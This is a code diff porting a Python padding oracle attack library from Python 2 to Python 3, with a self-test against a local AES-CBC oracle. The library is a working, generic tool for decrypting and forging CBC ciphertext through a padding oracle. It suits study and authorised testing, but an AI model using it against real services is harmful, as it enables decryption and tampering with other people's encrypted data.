@@ -3,7 +3,7 @@
 Padding Oracle Exploit API
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
 '''
-from itertools import izip, cycle
+from itertools import cycle
 import logging
 
 __all__ = [
@@ -50,7 +50,7 @@ class PaddingOracle(object):
         Responses from :attr:`~.history` are fed to :meth:`analyze` to
         help identify padding oracles.
 
-        :param bytearray data: A bytearray of (fuzzed) encrypted bytes.
+        :param bytes data: (fuzzed) encrypted bytes.
         :raises: :class:`BadPaddingException` if decryption reveals an
             oracle.
         '''
@@ -76,14 +76,19 @@ class PaddingOracle(object):
         :returns: Encrypted data.
         '''
         pad = block_size - (len(plaintext) % block_size)
-        plaintext = bytearray(plaintext + chr(pad) * pad)
+        if isinstance(plaintext, str): # convert to bytes if its a string
+            plaintext = plaintext.encode() + bytes([pad]) * pad
+        elif isinstance(plaintext, bytes):
+            plaintext = plaintext + bytes([pad]) * pad
+        else:
+            raise Exception('Bad data type for plaintext variable')
 
         self.log.debug('Attempting to encrypt %r bytes', str(plaintext))
 
         if iv is not None:
-            iv = bytearray(iv)
+            iv = iv
         else:
-            iv = bytearray(block_size)
+            iv = bytes([0] * block_size)
 
         self._encrypted = encrypted = iv
         block = encrypted
@@ -94,7 +99,7 @@ class PaddingOracle(object):
                                            **kwargs)
 
             block = xor(intermediate_bytes,
-                        plaintext[n - block_size * 2:n + block_size])
+                        plaintext[n - block_size * 2:n + block_size]) # minus?
 
             encrypted = block + encrypted
 
@@ -113,7 +118,10 @@ class PaddingOracle(object):
             or iv is None, the first *block_size* bytes will be used.
         :returns: Decrypted data.
         '''
-        ciphertext = bytearray(ciphertext)
+        if isinstance(ciphertext, str):
+            ciphertext = ciphertext.encode()
+        elif not isinstance(ciphertext, bytes):
+            raise Exception
 
         self.log.debug('Attempting to decrypt %r bytes', str(ciphertext))
 
@@ -121,11 +129,11 @@ class PaddingOracle(object):
             "Ciphertext not of block size %d" % (block_size, )
 
         if iv is not None:
-            iv, ctext = bytearray(iv), ciphertext
+            iv, ctext = iv, ciphertext
         else:
             iv, ctext = ciphertext[:block_size], ciphertext[block_size:]
 
-        self._decrypted = decrypted = bytearray(len(ctext))
+        self._decrypted = decrypted = bytearray([0] * len(ctext))
 
         n = 0
         while ctext:
@@ -174,7 +182,7 @@ class PaddingOracle(object):
             # Work on one byte at a time, starting with the last byte
             # and moving backwards
 
-            for byte_num in reversed(xrange(block_size)):
+            for byte_num in reversed(range(block_size)):
 
                 # clear oracle history for each byte
 
@@ -190,7 +198,7 @@ class PaddingOracle(object):
                 if byte_num == block_size - 1 and last_ok > 0:
                     r = last_ok
 
-                for i in reversed(xrange(r)):
+                for i in reversed(range(r)):
 
                     # Fuzz the test byte
 
@@ -233,7 +241,7 @@ class PaddingOracle(object):
 
                     intermediate_bytes[byte_num] = decrypted_byte
 
-                    for k in xrange(byte_num, block_size):
+                    for k in range(byte_num, block_size):
 
                         # XOR the current test byte with the padding value
                         # for this round to recover the decrypted byte
@@ -267,28 +275,28 @@ def xor(data, key):
     '''
     XOR two bytearray objects with each other.
     '''
-    return bytearray([x ^ y for x, y in izip(data, cycle(key))])
+    return bytearray([x ^ y for x, y in zip(data, cycle(key))])
 
 
 def test():
     import os
     from Crypto.Cipher import AES
 
-    teststring = 'The quick brown fox jumped over the lazy dog'
+    teststring = b'The quick brown fox jumped over the lazy dog'
 
     def pkcs7_pad(data, blklen=16):
         if blklen > 255:
             raise ValueError('Illegal block size %d' % (blklen, ))
         pad = (blklen - (len(data) % blklen))
-        return data + chr(pad) * pad
+        return data + bytes([pad] * pad)
 
     class PadBuster(PaddingOracle):
         def oracle(self, data):
-            _cipher = AES.new(key, AES.MODE_CBC, str(iv))
-            ptext = _cipher.decrypt(str(data))
-            plen = ord(ptext[-1])
+            _cipher = AES.new(key, AES.MODE_CBC, iv)
+            ptext = _cipher.decrypt(data)
+            plen = ptext[-1]
 
-            padding_is_good = (ptext[-plen:] == chr(plen) * plen)
+            padding_is_good = (ptext[-plen:] == bytes([plen] * plen))
 
             if padding_is_good:
                 return
@@ -297,45 +305,45 @@ def test():
 
     padbuster = PadBuster()
 
-    for _ in xrange(100):
+    for _ in range(100):
         key = os.urandom(AES.block_size)
         iv = bytearray(os.urandom(AES.block_size))
 
-        print "Testing padding oracle exploit in DECRYPT mode"
-        cipher = AES.new(key, AES.MODE_CBC, str(iv))
+        print("Testing padding oracle exploit in DECRYPT mode")
+        cipher = AES.new(key, AES.MODE_CBC, iv)
 
         data = pkcs7_pad(teststring, blklen=AES.block_size)
         ctext = cipher.encrypt(data)
 
-        print "Key:        %r" % (key, )
-        print "IV:         %r" % (iv, )
-        print "Plaintext:  %r" % (data, )
-        print "Ciphertext: %r" % (ctext, )
+        print("Key:        %r" % (key, ))
+        print("IV:         %r" % (iv, ))
+        print("Plaintext:  %r" % (data, ))
+        print("Ciphertext: %r" % (ctext, ))
 
         decrypted = padbuster.decrypt(ctext, block_size=AES.block_size, iv=iv)
 
-        print "Decrypted:  %r" % (str(decrypted), )
-        print "\nRecovered in %d attempts\n" % (padbuster.attempts, )
+        print("Decrypted:  %r" % (str(decrypted), ))
+        print("\nRecovered in %d attempts\n" % (padbuster.attempts, ))
 
         assert decrypted == data, \
             'Decrypted data %r does not match original %r' % (
                 decrypted, data)
 
-        print "Testing padding oracle exploit in ENCRYPT mode"
-        cipher2 = AES.new(key, AES.MODE_CBC, str(iv))
+        print("Testing padding oracle exploit in ENCRYPT mode")
+        cipher2 = AES.new(key, AES.MODE_CBC, iv)
 
         encrypted = padbuster.encrypt(teststring, block_size=AES.block_size)
 
-        print "Key:        %r" % (key, )
-        print "IV:         %r" % (iv, )
-        print "Plaintext:  %r" % (teststring, )
-        print "Ciphertext: %r" % (str(encrypted), )
+        print("Key:        %r" % (key, ))
+        print("IV:         %r" % (iv, ))
+        print("Plaintext:  %r" % (teststring, ))
+        print("Ciphertext: %r" % (str(encrypted), ))
 
-        decrypted = cipher2.decrypt(str(encrypted))[AES.block_size:]
-        decrypted = decrypted.rstrip(decrypted[-1])
+        decrypted = cipher2.decrypt(encrypted)[AES.block_size:]
+        decrypted = decrypted.rstrip(bytes([decrypted[-1]]))
 
-        print "Decrypted:  %r" % (str(decrypted), )
-        print "\nRecovered in %d attempts" % (padbuster.attempts, )
+        print("Decrypted:  %r" % (str(decrypted), ))
+        print("\nRecovered in %d attempts" % (padbuster.attempts, ))
 
         assert decrypted == teststring, \
             'Encrypted data %r does not decrypt to %r, got %r' % (
